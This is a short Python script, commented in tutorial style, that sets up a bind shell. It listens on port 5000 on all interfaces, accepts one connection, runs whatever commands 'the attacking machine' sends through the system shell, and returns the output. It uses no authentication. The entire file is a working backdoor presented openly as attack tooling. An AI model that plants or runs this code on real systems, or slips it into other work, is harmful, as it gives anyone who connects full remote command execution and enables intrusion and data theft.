from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep

# We define the address and port, the address 0.0.0.0.0 means that we accept connections from any interface.
server_address = ('0.0.0.0', 5000)

# We create the socket (the connection)
server_socket = socket()

# We pass it the tuple where we specify where to listen to
server_socket.bind(server_address)

# Maximum number of clients that can connect:
server_socket.listen(1)

# We wait for a connection and accept it:
client_socket, client_address = server_socket.accept()

state = True

while state:
    # We receive the command from the attacking machine
    command = client_socket.recv(4096).decode()

    # If the client sends "exit", we close the connection and exit the loop.
    if command == 'exit':
        # We close the connection with the customer
        client_socket.close()
        # Close server socket
        server_socket.close()
        state = False
    
    elif command.split(" ")[0] == 'cd':
        # Change working directory
        chdir(" ".join(command.split(" ")[1:]))
        client_socket.send("current path: {}".format(getcwd()).encode())
    
    else :
        # We execute the command and get its output:
        exit = getoutput(command)

        # We send the output to the attacking machine
        client_socket.send(exit.encode())
    
    sleep(0.1)